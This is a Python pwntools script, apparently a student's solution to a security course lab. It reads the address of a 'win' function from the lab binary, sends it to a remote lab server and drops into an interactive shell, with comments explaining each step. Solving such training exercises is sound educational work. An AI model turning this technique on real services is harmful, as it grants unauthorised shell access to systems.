import pwn

if __name__ == "__main__":
    
    # I examined the victim binary with Ghidra.
    # I found that the "win:" function allows an attacker to drop into a shell.
    
    # To use this function, I need to pass its address to the main function.
    # I can look up the address in decimal notation.
    victim_binary_as_assembly = pwn.ELF("./lab1-2.bin")
    win_function_address_as_int_decimal = victim_binary_as_assembly.symbols["win"]

    # I need to convert the integer into bytes for sending back to the process.
    win_function_address_as_string = str(win_function_address_as_int_decimal)
    win_fuction_address_as_bytes = win_function_address_as_string.encode()
    
    # I run the process.
    process_to_exploit = pwn.remote("csc748.hostbin.org", 7012)
    # This next line can replace the one above for testing against a local binary.
    # process_to_exploit = pwn.process("./lab1-2.bin")

    # I read the explanation information sent by the process.
    # This information is not useful, so I don't save it.
    process_to_exploit.readline()

    # I send the appropriate address to the process.
    process_to_exploit.send(win_fuction_address_as_bytes)

    # Now I can drop into a shell.
    process_to_exploit.interactive()

